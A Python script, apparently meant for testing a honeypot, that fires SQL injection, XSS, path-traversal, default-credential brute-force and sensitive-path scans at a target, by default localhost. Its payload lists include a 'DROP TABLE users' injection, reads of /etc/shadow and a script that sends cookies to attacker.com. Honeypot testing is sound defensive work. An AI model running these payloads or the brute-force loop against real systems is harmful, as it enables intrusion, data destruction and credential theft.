#!/usr/bin/env python
"""
Web Honeypot Attack Simulator

This script simulates various common web attacks against the honeypot.
It tests SQL injection, XSS, path traversal, and other web-based attacks.
"""

import asyncio
import random
import argparse
import logging
import aiohttp
import time
from datetime import datetime
from urllib.parse import urljoin

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("web_attack_simulator")

# Attack payloads for simulation
SQL_INJECTION_PAYLOADS = [
    "' OR 1=1 --",
    "admin' --",
    "' UNION SELECT username, password FROM users --",
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "1' OR '1' = '1",
    "1 OR 1=1",
    "' OR ''='",
    "' OR 1 --",
    "' OR 'x'='x",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<script>fetch('http://attacker.com/'+document.cookie)</script>",
]

PATH_TRAVERSAL_PATHS = [
    "../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../windows/win.ini",
    "../../../../boot.ini",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../windows/win.ini",
    "C:\\Windows\\system.ini",
]

COMMON_VULNERABLE_PATHS = [
    "/admin",
    "/phpmyadmin",
    "/wp-admin",
    "/config",
    "/backup",
    "/database",
    "/login.php",
    "/wp-login.php",
    "/admin.php",
    "/administrator",
    "/console",
    "/.git",
    "/.env",
    "/api/v1/users",
    "/api/v1/admin",
]

USER_AGENTS = [
    # Normal browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    # Scanner/attack tools
    "sqlmap/1.4.7 (http://sqlmap.org)",
    "Nikto/2.1.6",
    "Acunetix-Aspect-Security/1.0",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)",
    "w3af/2.0.0 (http://w3af.org)",
]

class WebAttackSimulator:
    """Simulate various web attacks against a honeypot."""

    def __init__(self, target_url='http://127.0.0.1:8089'):
        """Initialize the web attack simulator."""
        self.target_url = target_url
        self.attack_count = 0
        self.session = None
    
    async def setup_session(self):
        """Set up the HTTP session for the attack."""
        self.session = aiohttp.ClientSession()
    
    async def close_session(self):
        """Close the HTTP session."""
        if self.session:
            await self.session.close()
    
    async def simulate_login_bruteforce(self, attempts=5):
        """Simulate brute force attempts against the login page."""
        logger.info(f"Starting login brute force simulation ({attempts} attempts)")
        login_url = urljoin(self.target_url, "/login")
        
        # Common username/password combinations
        credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "administrator", "password": "administrator"},
            {"username": "root", "password": "toor"},
            {"username": "user", "password": "password"},
            {"username": "guest", "password": "guest"},
            {"username": "test", "password": "test"},
            {"username": "admin", "password": "123456"},
            {"username": "admin", "password": "admin123"},
            {"username": "administrator", "password": "password123"},
        ]
        
        for i in range(min(attempts, len(credentials))):
            creds = credentials[i]
            user_agent = random.choice(USER_AGENTS)
            headers = {"User-Agent": user_agent}
            
            try:
                async with self.session.post(login_url, data=creds, headers=headers) as response:
                    status = response.status
                    text = await response.text()
                    
                    logger.info(f"Login attempt {i+1}/{attempts}: {creds['username']}:{creds['password']} - Status: {status}")
                    self.attack_count += 1
            except Exception as e:
                logger.error(f"Error during login attempt: {str(e)}")
            
            # Add delay between attempts
            await asyncio.sleep(random.uniform(0.5, 1.5))
    
    async def simulate_sql_injection(self, attempts=5):
        """Simulate SQL injection attacks."""
        logger.info(f"Starting SQL injection simulation ({attempts} attempts)")
        login_url = urljoin(self.target_url, "/login")
        
        for i in range(min(attempts, len(SQL_INJECTION_PAYLOADS))):
            payload = SQL_INJECTION_PAYLOADS[i]
            user_agent = random.choice(USER_AGENTS)
            headers = {"User-Agent": user_agent}
            
            # Try in username field
            data = {"username": payload, "password": "anything"}
            
            try:
                async with self.session.post(login_url, data=data, headers=headers) as response:
                    status = response.status
                    text = await response.text()
                    
                    logger.info(f"SQL injection attempt {i+1}/{attempts} (username field): {payload} - Status: {status}")
                    self.attack_count += 1
            except Exception as e:
                logger.error(f"Error during SQL injection attempt: {str(e)}")
            
            # Try in password field
            data = {"username": "admin", "password": payload}
            
            try:
                async with self.session.post(login_url, data=data, headers=headers) as response:
                    status = response.status
                    text = await response.text()
                    
                    logger.info(f"SQL injection attempt {i+1}/{attempts} (password field): {payload} - Status: {status}")
                    self.attack_count += 1
            except Exception as e:
                logger.error(f"Error during SQL injection attempt: {str(e)}")
            
            # Add delay between attempts
            await asyncio.sleep(random.uniform(0.5, 1.5))
    
    async def simulate_xss_attacks(self, attempts=5):
        """Simulate Cross-Site Scripting (XSS) attacks."""
        logger.info(f"Starting XSS attack simulation ({attempts} attempts)")
        login_url = urljoin(self.target_url, "/login")
        
        for i in range(min(attempts, len(XSS_PAYLOADS))):
            payload = XSS_PAYLOADS[i]
            user_agent = random.choice(USER_AGENTS)
            headers = {"User-Agent": user_agent}
            
            # Try XSS in username field
            data = {"username": payload, "password": "password"}
            
            try:
                async with self.session.post(login_url, data=data, headers=headers) as response:
                    status = response.status
                    text = await response.text()
                    
                    logger.info(f"XSS attempt {i+1}/{attempts}: {payload} - Status: {status}")
                    self.attack_count += 1
            except Exception as e:
                logger.error(f"Error during XSS attempt: {str(e)}")
            
            # Try as GET parameter
            query_url = f"{login_url}?q={payload}"
            
            try:
                async with self.session.get(query_url, headers=headers) as response:
                    status = response.status
                    text = await response.text()
                    
                    logger.info(f"XSS GET attempt {i+1}/{attempts}: {query_url} - Status: {status}")
                    self.attack_count += 1
            except Exception as e:
                logger.error(f"Error during XSS GET attempt: {str(e)}")
            
            # Add delay between attempts
            await asyncio.sleep(random.uniform(0.5, 1.5))
    
    async def simulate_path_traversal(self, attempts=5):
        """Simulate path traversal attacks."""
        logger.info(f"Starting path traversal simulation ({attempts} attempts)")
        
        for i in range(min(attempts, len(PATH_TRAVERSAL_PATHS))):
            path = PATH_TRAVERSAL_PATHS[i]
            target_url = urljoin(self.target_url, path)
            user_agent = random.choice(USER_AGENTS)
            headers = {"User-Agent": user_agent}
            
            try:
                async with self.session.get(target_url, headers=headers) as response:
                    status = response.status
                    text = await response.text()
                    
                    logger.info(f"Path traversal attempt {i+1}/{attempts}: {path} - Status: {status}")
                    self.attack_count += 1
            except Exception as e:
                logger.error(f"Error during path traversal attempt: {str(e)}")
            
            # Add delay between attempts
            await asyncio.sleep(random.uniform(0.5, 1.5))
    
    async def simulate_vulnerability_scanning(self, attempts=10):
        """Simulate scanning for common vulnerable paths."""
        logger.info(f"Starting vulnerability scanning simulation ({attempts} attempts)")
        
        paths = random.sample(COMMON_VULNERABLE_PATHS, min(attempts, len(COMMON_VULNERABLE_PATHS)))
        
        for i, path in enumerate(paths):
            target_url = urljoin(self.target_url, path)
            user_agent = random.choice(USER_AGENTS)
            headers = {"User-Agent": user_agent}
            
            try:
                async with self.session.get(target_url, headers=headers) as response:
                    status = response.status
                    text = await response.text()
                    
                    logger.info(f"Vulnerability scan {i+1}/{len(paths)}: {path} - Status: {status}")
                    self.attack_count += 1
            except Exception as e:
                logger.error(f"Error during vulnerability scan: {str(e)}")
            
            # Add delay between attempts
            await asyncio.sleep(random.uniform(0.2, 1.0))
    
    async def run_all_simulations(self):
        """Run all web attack simulations."""
        logger.info(f"Starting web attack simulations against {self.target_url}")
        
        await self.setup_session()
        
        try:
            # Run login brute force simulation
            await self.simulate_login_bruteforce(attempts=5)
            
            # Run SQL injection simulation
            await self.simulate_sql_injection(attempts=5)
            
            # Run XSS attack simulation
            await self.simulate_xss_attacks(attempts=5)
            
            # Run path traversal simulation
            await self.simulate_path_traversal(attempts=5)
            
            # Run vulnerability scanning simulation
            await self.simulate_vulnerability_scanning(attempts=10)
            
            logger.info(f"Completed all web attack simulations. Total attacks: {self.attack_count}")
        finally:
            await self.close_session()

async def main():
    """Main function to run the web attack simulator."""
    parser = argparse.ArgumentParser(description='Web Honeypot Attack Simulator')
    parser.add_argument('--url', type=str, default='http://127.0.0.1:8089',
                        help='Target URL (default: http://127.0.0.1:8089)')
    args = parser.parse_args()
    
    print("=" * 70)
    print(f"Web Honeypot Attack Simulator - {datetime.now()}")
    print("=" * 70)
    print(f"Target URL: {args.url}")
    print("This tool simulates various web attacks for testing honeypots")
    print("=" * 70)
    
    simulator = WebAttackSimulator(args.url)
    await simulator.run_all_simulations()

if __name__ == "__main__":
    asyncio.run(main())
